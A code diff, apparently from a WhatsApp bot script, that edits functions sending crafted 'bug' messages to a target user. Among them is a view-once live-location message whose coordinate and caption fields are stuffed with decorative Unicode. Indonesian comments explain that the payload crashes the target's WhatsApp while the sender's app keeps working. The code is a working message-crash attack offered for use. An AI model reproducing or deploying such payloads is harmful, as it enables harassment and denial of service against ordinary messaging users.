@@ -51,6 +51,7 @@ title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?�
 }
 }
 }
+
 const force = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -76,19 +77,11 @@ remoteJid: ""
 }
 }
 
-const ryobug = {
-	key: {
-		remoteJid: 'status@broadcast',
-		fromMe: false, 
-		participant: '0@s.whatsapp.net'
-	},
-    message: {
-        listResponseMessage: {
-            title: `🎲 Classic Bugs 🤔 `
-        }
-    }
-}
-//================°
+
+
+
+
+//===========°
 const hmbug = async (target, txt) => {
   await sleep(300);
   var etc = {
@@ -466,9 +459,9 @@ var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
-    "degreesLatitude": "",
-    "degreesLongitude": "",
-    "caption": `Hey Bro 👋`,
+    "degreesLatitude": "🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅Lets Dance☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅Booom 😅 ☆ ꧏ🤍҈ ༑`,
     "sequenceNumber": "9",
     "jpegThumbnail": ""
      }
@@ -477,7 +470,7 @@ message: {
 }), { userJid: m.chat, quoted: kuwoted })
 //await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
 await zetsubo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
-	 }
+	}
 
 /*let reactionMessage = {
                     react: {
